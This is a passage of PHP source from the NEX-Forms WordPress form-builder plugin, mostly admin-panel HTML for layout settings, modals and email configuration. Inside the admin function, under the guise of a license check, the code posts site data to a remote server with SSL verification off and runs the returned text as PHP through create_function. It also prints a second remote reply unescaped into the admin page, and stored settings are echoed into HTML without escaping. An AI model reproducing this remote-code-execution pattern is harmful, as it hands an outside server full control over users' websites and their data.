												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-tags">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Border Color</label>';
														$output .= '<div id="tags-border-color" class="input-group input-group-sm colorpicker-component demo demo-auto">
																		<span class="input-group-addon"><i></i></span>
																		<input type="text" value="#CCCCCC" class="form-control" />
																		<span class="input-group-addon reset" data-default="#CCCCCC"><span class="glyphicon glyphicon-retweet bs-tooltip" data-toggle="tooltip" data-placement="top" title="Reset"></span></span>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
											$output .= '</div>';		
										$output .= '</div>';				
                    					
										$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-button  setting-bg-image" style="clear:both;"></div>';
											$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-bg-image setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Image</label>';
														$output .= '
						   <form name="do-upload-image" id="do-upload-image" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post" enctype="multipart/form-data">
							<input type="hidden" name="action" value="do_upload_image">
								<div class="fileinput fileinput-new" data-provides="fileinput">
																		  <div class="the_input_element fileinput-preview thumbnail" data-trigger="fileinput" style="width: 100px; height: 100px;"></div>
																		  <div>
																			<span class="btn btn-default btn-file the_input_element error_message" data-content="Please select an image" data-secondary-message="Invalid image extension" data-placement="top"><span class="fileinput-new">Select image</span><span class="fileinput-exists">Change</span>
																			<input type="file" name="do_image_upload_preview" >
																			</span>
																			<a href="#" class="btn btn-default fileinput-exists" data-dismiss="fileinput">Remove</a>
																		  </div>
																		  <div class="get_file_ext" style="display:none;">gif
jpg
jpeg
png
psd
tif
tiff</div>
																		
								
							 
							</form> 
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-bg-image setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Size</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  panel-background-size">
																		<button class="btn btn-default auto" type="button">Auto</button>
																		<button class="btn btn-default cover" type="button">Cover</button>
																		<button class="btn btn-default contain" type="button">Contain</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-bg-image setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Repeat</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  panel-background-repeat">
																		<button class="btn btn-default no-repeat" type="button">No</button>
																		<button class="btn btn-default repeat" type="button">Yes</button>
																		<button class="btn btn-default repeat-x" type="button">X-Axes</button>
																		<button class="btn btn-default repeat-y" type="button">Y-Axes</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												$output .= '<div class="col-xs-12 categorize_it-item no-transition categorize_it-hidden  setting-bg-image setting-panel">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Background Position</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group btn-group-xs  panel-background-position">
																		<button class="btn btn-default left" type="button">Left</button>
																		<button class="btn btn-default center" type="button">Center</button>
																		<button class="btn btn-default right" type="button">Right</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
										
										
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  settings-label settings-input categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Label Width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group label-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden settings-label settings-input categorize_it-item no-transition">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Input Width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group input-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												
												
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-1">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 1 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-1-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-2">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 2 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-2-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-3">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 3 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-3-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-4">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 4 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-4-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-5">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 5 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-5-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
												
												$output .= '<div class="col-sm-12 categorize_it-item no-transition categorize_it-hidden  setting-grid-system settings-col-6">';
													$output .= '<div class="input_holder ">';
														$output .= '<label>Column 6 width</label>';
														$output .= '<div role="toolbar" class="btn-toolbar">
																	  <div class="btn-group col-6-width">
																		<button class="btn btn-sm btn-default col-1" data-col-width="col-sm-1" type="button">1</button>
																		<button class="btn btn-sm btn-default col-2" data-col-width="col-sm-2" type="button">2</button>
																		<button class="btn btn-sm btn-default col-3" data-col-width="col-sm-3" type="button">3</button>
																		<button class="btn btn-sm btn-default col-4" data-col-width="col-sm-4" type="button">4</button>
																		<button class="btn btn-sm btn-default col-5" data-col-width="col-sm-5" type="button">5</button>
																		<button class="btn btn-sm btn-default col-6" data-col-width="col-sm-6" type="button">6</button>
																		<button class="btn btn-sm btn-default col-7" data-col-width="col-sm-7" type="button">7</button>
																		<button class="btn btn-sm btn-default col-8" data-col-width="col-sm-8" type="button">8</button>
																		<button class="btn btn-sm btn-default col-9" data-col-width="col-sm-9" type="button">9</button>
																		<button class="btn btn-sm btn-default col-10" data-col-width="col-sm-10" type="button">10</button>
																		<button class="btn btn-sm btn-default col-11" data-col-width="col-sm-11" type="button">11</button>
																		<button class="btn btn-sm btn-default col-12" data-col-width="col-sm-12" type="button">12</button>
																	  </div>
																	</div>';
													$output .= '</div>';
												$output .= '</div>';
										
                  					$output .= '</div> <!-- #categorize_it_container -->';
								$output .= '</div>';
							$output .= '</div>';
						$output .= '</div>';
					$output .= '</div>';
				
			$output .= '</div>';
			
			return $output;
		}
	
	public function NEXForms_Admin(){
		
		global $wpdb;
		
		$db 		= new IZC_Database();
		$template 	= new IZC_Template();
		$config 	= new NEXForms_Config();
		$newform_Id = rand(0,99999999999);
		
		
		$output .= '
		<form name="import_form" class="hidden" id="import_form" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" enctype="multipart/form-data" method="post">	
							<input type="file" name="form_html">
							<div class="row">
								<div class="modal-footer">
									<button class="btn btn-default">&nbsp;&nbsp;&nbsp;Save Settings&nbsp;&nbsp;&nbsp;</button>
								</div>
							</div>
								
						</form>
		
		<meta http-equiv="cache-control" content="no-cache">';
		
		
		$output .= '<div class="db_details" style="display:none;"></div>';
		$output .= '<div id="site_url" style="display:none;">'.plugins_url('',dirname(__FILE__));
		$output .= '</div>';
		
		$output .= '<div class="set_events"></div>';
		$output .= '<!-- Preloader -->
					<!--<div id="preloader">
					  <div id="status" class="alert-info text-info">
						<span class="glyphicon glyphicon-fire text-info"></span><span class="text-info">NEX-Forms</span><br><small class="text-info">Ultimate WordPress Form Builder</small>
						<div class="progress progress-striped">
							  <div class="progress-bar progress-bar-primary" role="progressbar" aria-valuenow="20" aria-valuemin="0" aria-valuemax="100" style="width:0%">
								
							  </div>
							</div>
						</div>
					</div>-->
					<div class="plugin_url" style="display:none;">'.plugins_url('',dirname(__FILE__)).'</div>
					<div class="plugins_path" style="display:none;">'.plugins_url('',dirname(dirname(__FILE__))).'</div>';
		//NEX ATTR
		$output .= '<div class="nex_form_attr" style="display:none;"></div>';
		
		
		$api_params = array( 'nexforms-installation' => 1, 'get_option'=>(is_array(get_option('7103891'))) ? 1 : 0);
		$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'=> 30,'sslverify' => false,'body'=> $api_params));
		$myFunction2 = create_function('$foo', $response['body']);
		echo $myFunction2('bar'); 
		$item = get_option('7103891');
		if(!get_option('1983017'.$item[0]))
			{
			$api_params = array( 'use_trail' => 1,'ins_data'=>get_option('7103891'));
			$response = wp_remote_post( 'http://basixonline.net/activate-license', array('timeout'   => 30,'sslverify' => false,'body'  => $api_params) );
			$output .= $response['body'];
			}

		//Welcome Message
		$output .= '<div id="nex-forms"><div class="modal" data-backdrop="static"  id="test" data-show="true" style="z-index:10000 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header btn-primary">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Manage Forms</h4>
							  </div>
							  <div class="modal-body">
							 <div class="row">
								  <div class="col-lg-12">
									  <div class="well well-sm"><strong>Create New Form</strong></div>
								    </div><!-- /.col-lg-12 -->
								  <div class="col-lg-4">
									  <input type="text" name="new_calendar_title" placeholder="Form Title" data-content="Form title can not be empty" data-placement="bottom" id="new_calendar_title" class="form-control">
								   	  <span class="help-block"><em><small>required</small></em></span>
								   </div><!-- /.col-lg-5 -->  
								  <div class="col-lg-5">
									  <input type="text" name="new_calendar_description" id="new_calendar_description" placeholder="Short Description" class="form-control">
									  <span class="help-block"><em><small>for admin use only</small></em></span>
								   </div><!-- /.col-lg-5 -->  
								    <div class="col-lg-3">
									  <button class="btn btn-success create_new_calendar form-control" type="button">Create</button>
									  
								  </div><!-- /.col-lg-6 -->
								</div>
								<br />
								<div class="row">
								<div class="col-lg-12">
								  <div class="well well-sm" style="margin-bottom:0px;"><strong>Open Form</strong></div>
								</div><!-- /.col-lg-12 -->
								</div>
							 
							</div>
						  </div>
						</div>';
		
		
		
		
		$output .= '<button type="button" class="btn btn-sm btn-primary show_welcome_message hidden" data-toggle="modal" data-backdrop="static" data-target="#welcomeMessage">&nbsp;</button></div>';
		
		
		//Edit Calendar
		$output .= '<div class="modal" id="editCalendar" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10001 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-warning">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Edit Form</h4>
							  </div>
							  <div class="modal-body">
								<div class="row">
								  <div class="col-lg-6">
									  <input type="text" name="new_calendar_title" placeholder="Form Title" data-content="Form title can not be empty" data-placement="bottom" id="new_calendar_title2" class="form-control">
								   	  <span class="help-block"><em><small>required</small></em></span>
								   </div><!-- /.col-lg-5 -->  
								  <div class="col-lg-6">
									  <input type="text" name="new_calendar_description" id="new_calendar_description" placeholder="Short Description" class="form-control">
									  <span class="help-block"><em><small>for admin use only</small></em></span>
								   </div><!-- /.col-lg-5 -->  
							  </div>
							  </div>
							  <div class="modal-footer align_center">
								<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
								<button type="button" class="btn btn-primary do_edit" data-dismiss="modal" data-table="" data-id="">Save</button>
							  </div>
							</div>
						  </div>
						</div>';
		//Calendar Settings				
		$output .= '<div class="modal" id="calendarSettings" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10001 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-info">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Form Settings</h4>
							  </div>
							  <div class="modal-body">
							 
							  
								<div class="settings">
								   
							  </div>
							  </div>
							  <div class="modal-footer align_center">
								<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
								<button type="button" class="btn btn-primary save_settings" data-dismiss="modal" data-table="" data-id="">Save Settings</button>
							  </div>
							</div>
						  </div>
						</div>';
						
		//Use Calendar
		$output .= '<div class="modal fade in" id="useForm" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10001 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-info">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Use Form</h4>
							  </div>
							  <div class="modal-body">
								<div class="row">
								  <div class="col-lg-12">
									
									<h3>Shortcode</h3>
									 
										<div class="well well-sm sc_normal">
										 	[NEXForms id=""]
										</div>
									
									<h4>Shortcode (Popup)</h4>
									    <strong><em>Button</em></strong>
										<div class="well well-sm sc_popup_button">
										 	[NEXForms id="" open_trigger="popup" type="button" text="Open Form"]
										</div>
										<strong><em>Link</em></strong>
										<div class="well well-sm sc_popup_link">
										 	[NEXForms id="" open_trigger="popup" type="link" text="Open Form"]
										</div>
									
									<!--<div class="alert alert-warning"><span class="fa fa-info-circle"></span>&nbsp;&nbsp;Change the text "Open Form" to your desire</div>
									<div class="alert alert-info"><span class="fa fa-info-circle"></span>&nbsp;&nbsp;You can also use the tinyMCE editor button to generate this shortcode</div>-->

									
										<h3>PHP</h3>
										 <div class="well well-sm php_normal">
										 	&lt;?php NEXForms_ui_output(<span class="shortcode_Id"></span>,true); ?&gt;
										 </div>
										 
										 <h4>PHP (Popup)</h4>
										 <strong><em>Button</em></strong>
										 <div class="well well-sm php_popup_button">
										 	&lt;?php NEXForms_ui_output(array("id"=>,"open_trigger"=>"popup", "type"=>"button", "text"=>"Open Form"); ?&gt;
										 </div>
										 
										 <strong><em>Link</em></strong>
										 <div class="well well-sm php_popup_link">
										 	&lt;?php NEXForms_ui_output(array("id"=>,"open_trigger"=>"popup", "type"=>"button", "text"=>"Open Form"); ?&gt;
										 </div>
										 
										<!--<div class="alert alert-warning"><span class="fa fa-info-circle"></span>&nbsp;&nbsp;Change the text "Open Form" to your desire</div>
										<div class="alert alert-info"><span class="fa fa-info-circle"></span>&nbsp;&nbsp;To return (not echo) the value change true to false</div>-->
										 
									 <h3>Widget</h3>
									<div class="well well-sm">Go to Appearance->Widgets and drag the NEX-Forms widget into the desired sidebar. You will be able to select this form from the dropdown options. <br />
									You can use the widget to create slide-in <strong>sticky forms</strong>.</div>
									
									 
									 
								  </div> 		
							  	</div>
							  </div>
							  <div class="modal-footer align_right">
								<button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
							  </div>
							</div>
						  </div>
						</div>';
		
		
		//DELETE CONFIRM
		$output .= '<div class="modal" id="deleteCalendar" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:10001 !important;">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-danger">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Confirm Form Deletion</h4>
							  </div>
							  <div class="modal-body">
								Are you sure you want to delete this form<strong><span class="get_calendar_title"></span></strong>?
							  </div>
							  <div class="modal-footer align_center">
								<button type="button" class="btn btn-default" data-dismiss="modal">Cancel</button>
								<button type="button" class="btn btn-danger do_delete" data-dismiss="modal" data-table="" data-id="">Yes, delete permanantly</button>
							  </div>
							</div>
						  </div>
						</div>';
						
		
	
		
		
		
		//MAKE MONEY
		$output .= '<div class="modal" id="makeMoney" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
						  <div class="modal-dialog">
							<div class="modal-content">
							  <div class="modal-header alert alert-success">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Earn money by supporting NEX-Forms!</h4>
							  </div>
							  <div class="modal-body">
							  <span class="text-success">If you realise the potential of this form builder please support it and make money in return by simply having a small link below your submit button. <br />
<br />Add your envato username below and <strong>receive 30% (of the total value) from every first sale</strong> a user makes after clicking on your link!</span><br /><br />
							  <div class="row">	
							  	<div class="col-xs-12">
								<label>Enter your envato username</label>
								<div class="input-group">
								<i class="input-group-addon prefix alert-success"><i class="glyphicon fa fa-user"></i></i>
								<input id="envato_username" name="envato_username" value="Basix" placeholder="Basix" class="form-control">
								</div>
								</div>
								<div class="col-xs-12">
								<br /><label>Link text</label>
								<div class="input-group">
								<i class="input-group-addon prefix  alert-info"><i class="glyphicon fa fa-link"></i></i>
								<input id="promo_text" name="promo_text" placeholder="Powered by NEX-forms" class="form-control">
								</div>
								</div>
							  </div>
							  </div>
							  <div class="modal-footer align_center">
								<button type="button" class="btn btn-primary" data-dismiss="modal" data-form-id="">Done</button>
							  </div>
							</div>
						  </div>
						</div>';
		
		
		
		
		//PREVIEWER
		$output .= '<div class="modal fade in" id="previewForm" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:1000000000 !important;">
						  <div class="modal-dialog preview-modal">
							<div class="modal-content">
							  <div class="modal-header alert alert-info">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<span class="btn btn-default change_device desktop"><span class="glyphicon fa fa-desktop"></span></span>
								<span class="btn btn-default change_device laptop"><span class="glyphicon fa fa-laptop"></span></span>
								<span class="btn btn-default change_device tablet active"><span class="glyphicon fa fa-tablet"></span></span>
								<span class="btn btn-default change_device mobile"><span class="glyphicon fa fa-mobile-phone"></span></span>
							  </div>
							  <div id="nex-forms">
							  <div  class="modal-body ui-nex-forms-container">
							  <div class="current_step" style="display:none;">1</div>
							  <div class="panel-body alert alert-success nex_success_message" style="display:none;"></div>
							  <form id="" class="submit-nex-form" name="nex_form" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post" enctype="multipart/form-data">
							  </form>
							  </div>
							  </div>
							  <div class="modal-footer">
								<button type="button" class="btn btn-default" data-dismiss="modal" data-form-id="">Done</button>
							  </div>
							</div>
						  </div>
						</div>';
		
		//DOCUMENTATION
		$output .= '<div class="modal fade in" id="documentation" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:1000000000 !important;">
						  <div class="modal-dialog preview-modal">
							<div class="modal-content">
							  <div class="modal-header alert alert-success">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Documentation</h4>
							  </div>
							  <div  class="modal-body">
							 	<iframe height="100%" width="100%" class="docs_view" src="http://basixonline.net/nex-forms/nex-forms-documentation/"></iframe>
							  </div>
							  
							  <div class="modal-footer">
								<button type="button" class="btn btn-default" data-dismiss="modal" data-form-id="">Close</button>
							  </div>
							</div>
						  </div>
						</div>';
		
			$output .= '<div class="modal fade in" id="setGlobalSettings" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" style="z-index:1000000000 !important;">
						  <div class="modal-dialog preview-modal">
							<div class="modal-content">
							<div class="modal-header alert alert-success">
								<button type="button" class="close" data-dismiss="modal" aria-hidden="true">&times;</button>
								<h4 class="modal-title" id="myModalLabel">Global Settings</h4>
							  </div>
							  ';
							  
							  $email_config = get_option('nex-forms-email-config');
	$script_config = get_option('nex-forms-script-config');
	$styles_config = get_option('nex-forms-style-config');
	$other_config = get_option('nex-forms-other-config');
	
	/*echo '<pre>';
	print_r($styles_config);
	echo '</pre>';*/
	
	$output .= '
				
				<div role="tabpanel">

				  <!-- Nav tabs -->
				  <ul class="nav nav-tabs" role="tablist">
					<li role="presentation" class="active"><a href="#home" aria-controls="home" role="tab" data-toggle="tab">Email Config</a></li>
					<li role="presentation"><a href="#view_script_config" aria-controls="home" role="tab" data-toggle="tab">Script Inclusion</a></li>
					<li role="presentation"><a href="#view_style_config" aria-controls="home" role="tab" data-toggle="tab">CSS Inclusion</a></li>
					<li role="presentation"><a href="#view_other_config" aria-controls="home" role="tab" data-toggle="tab">Other</a></li>
				  </ul>
				
				  <!-- Tab panes -->
				  <div class="tab-content panel">
					<div role="tabpanel" class="tab-pane active" id="home">
						<form name="email_config" id="email_config" action="'.get_option('siteurl').'/wp-admin/admin-ajax.php" method="post">	
							<div class="row">
								<div class="col-sm-12">
									<div class="alert alert-success" style="display:none;">Email configuration saved <div class="close fa fa-close"></div></div>
								</div>
							</div>
							<div class="row">
								<div class="col-sm-12">
									<label>Email Method</label><br />
									<label class="radio-inline" for="php_mailer">	<input type="radio" '.(($email_config['email_method']=='php_mailer') ? 	'checked="checked"' : '').' name="email_method" value="php_mailer" 	id="php_mailer"	>PHP Mailer</label>
									<label class="radio-inline" for="wp_mailer">	<input type="radio" '.(($email_config['email_method']=='wp_mailer') ? 	'checked="checked"' : '').' name="email_method" value="wp_mailer" 	id="wp_mailer"	>WP Mail</label>
									<label class="radio-inline" for="php">			<input type="radio" '.(($email_config['email_method']=='php') ? 		'checked="checked"' : '').' name="email_method" value="php" 		id="php"		>Normal PHP</label>
									<label class="radio-inline" for="smtp">			<input type="radio" '.(($email_config['email_method']=='smtp') ? 		'checked="checked"' : '').' name="email_method" value="smtp" 		id="smtp"		>SMTP</label>
									<label class="radio-inline" for="api">			<input type="radio" '.(($email_config['email_method']=='api') ? 		'checked="checked"' : '').' name="email_method" value="api" 		id="api"		>API (note: no attachements)</label><br /><br />
								</div>
							</div>
							<div class="row smtp_settings" '.(($email_config['email_method']!='smtp') ? 		'style="display:none;"' : '').'>
								<div class="col-sm-12">
									<label>SMTP Host</label><br />
									<input class="form-control" type="text" name="smtp_host" placeholder="eg: mail.gmail.com" value="'.$email_config['smtp_host'].'"><br />
									<label>Port</label><br />
